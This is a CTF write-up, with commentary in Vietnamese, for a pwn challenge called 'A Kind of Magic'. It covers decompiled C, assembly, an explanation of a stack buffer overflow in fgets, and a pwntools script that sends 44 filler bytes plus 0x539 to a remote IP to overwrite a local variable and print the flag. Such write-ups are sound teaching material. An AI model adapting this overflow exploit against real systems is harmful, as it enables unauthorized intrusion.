# Challenge name: A Kind of Magic

### Description
You're a magic man aren't you? Well can you show me?

## Pseudocode
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+3Ch] [rbp-4h]
  v5 = 0;
  puts("Is this a kind of magic? What is your magic?: ");
  fflush(_bss_start);
  fgets(s, 64, stdin);
  printf("You entered %s\n", s);
  printf("Your magic is: %d\n", v5);
  fflush(_bss_start);
  if ( v5 == 1337 )
  {
    puts("Whoa we got a magic man here!");
    fflush(_bss_start);
    system("cat flag.txt");
  }
  else
  {
    puts("You need to challenge the doors of time");
    fflush(_bss_start);
  }
  return 0;
}
```

## Assembly code
```assembly
.text:00000000000011C9 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000000011C9                 public main
.text:00000000000011C9 main            proc near               ; DATA XREF: _start+21↑o
.text:00000000000011C9
.text:00000000000011C9 var_40          = qword ptr -40h
.text:00000000000011C9 var_34          = dword ptr -34h
.text:00000000000011C9 s               = byte ptr -30h
.text:00000000000011C9 var_4           = dword ptr -4
.text:00000000000011C9
.text:00000000000011C9 ; __unwind {
.text:00000000000011C9                 endbr64
.text:00000000000011CD                 push    rbp
.text:00000000000011CE                 mov     rbp, rsp
.text:00000000000011D1                 sub     rsp, 40h
.text:00000000000011D5                 mov     [rbp+var_34], edi
.text:00000000000011D8                 mov     [rbp+var_40], rsi
.text:00000000000011DC                 mov     [rbp+var_4], 0
.text:00000000000011E3                 lea     rdi, s          ; "Is this a kind of magic? What is your m"...
.text:00000000000011EA                 call    _puts
.text:00000000000011EF                 mov     rax, cs:__bss_start
.text:00000000000011F6                 mov     rdi, rax        ; stream
.text:00000000000011F9                 call    _fflush
.text:00000000000011FE                 mov     rdx, cs:stdin@GLIBC_2_2_5 ; stream
.text:0000000000001205                 lea     rax, [rbp+s]
.text:0000000000001209                 mov     esi, 40h ; '@'  ; n
.text:000000000000120E                 mov     rdi, rax        ; s
.text:0000000000001211                 call    _fgets
.text:0000000000001216                 lea     rax, [rbp+s]
.text:000000000000121A                 mov     rsi, rax
.text:000000000000121D                 lea     rdi, format     ; "You entered %s\n"
.text:0000000000001224                 mov     eax, 0
.text:0000000000001229                 call    _printf
.text:000000000000122E                 mov     eax, [rbp+var_4]
.text:0000000000001231                 mov     esi, eax
.text:0000000000001233                 lea     rdi, aYourMagicIsD ; "Your magic is: %d\n"
.text:000000000000123A                 mov     eax, 0
.text:000000000000123F                 call    _printf
.text:0000000000001244                 mov     rax, cs:__bss_start
.text:000000000000124B                 mov     rdi, rax        ; stream
.text:000000000000124E                 call    _fflush
.text:0000000000001253                 cmp     [rbp+var_4], 539h
.text:000000000000125A                 jnz     short loc_1285
.text:000000000000125C                 lea     rdi, aWhoaWeGotAMagi ; "Whoa we got a magic man here!"
.text:0000000000001263                 call    _puts
.text:0000000000001268                 mov     rax, cs:__bss_start
.text:000000000000126F                 mov     rdi, rax        ; stream
.text:0000000000001272                 call    _fflush
.text:0000000000001277                 lea     rdi, command    ; "cat flag.txt"
.text:000000000000127E                 call    _system
.text:0000000000001283                 jmp     short loc_12A0
.text:0000000000001285 ; ---------------------------------------------------------------------------
.text:0000000000001285
.text:0000000000001285 loc_1285:                               ; CODE XREF: main+91↑j
.text:0000000000001285                 lea     rdi, aYouNeedToChall ; "You need to challenge the doors of time"
.text:000000000000128C                 call    _puts
.text:0000000000001291                 mov     rax, cs:__bss_start
.text:0000000000001298                 mov     rdi, rax        ; stream
.text:000000000000129B                 call    _fflush
.text:00000000000012A0
.text:00000000000012A0 loc_12A0:                               ; CODE XREF: main+BA↑j
.text:00000000000012A0                 mov     eax, 0
.text:00000000000012A5                 leave
.text:00000000000012A6                 retn
.text:00000000000012A6 ; } // starts at 11C9
.text:00000000000012A6 main            endp
```

## Methodology
Có thể thấy có 1 câu lệnh if kiểm tra điều kiện và in ra flag. Điều kiện để in ra được flag là "v5 = 1337", mà v5 lại được gán bằng 0 ở đầu hàm. Nên ta nghĩ ngay đến việc thay đổi biến v5 này. 

Có thể thấy s được khai báo chỉ có 44 nhưng khi dùng hàm gets nhập lại có thể nhập được 64 nên có khai thác tại đây.

Dựa vào mã assembly trên thì có thể thấy stack:

![image](https://user-images.githubusercontent.com/88301536/139680460-d9b608f7-0f95-484f-9388-bc16174e0fe3.png)

Có thể dùng gdb chạy debug để tìm địa chỉ của stack

## Exploit
```python
from pwn import *
#r = process('./akindofmagic')
r = remote('143.198.184.186', 5000)
#raw_input('>>')
pl = b'A'*44

pl += p32(0x539)
r.sendline(pl)
r.interactive()
```
Chạy code  trên có được flag

![image](https://user-images.githubusercontent.com/69805864/139617352-d7663cc0-d0ba-4b51-b109-3fe41fad1d77.png)

## FLAG: flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
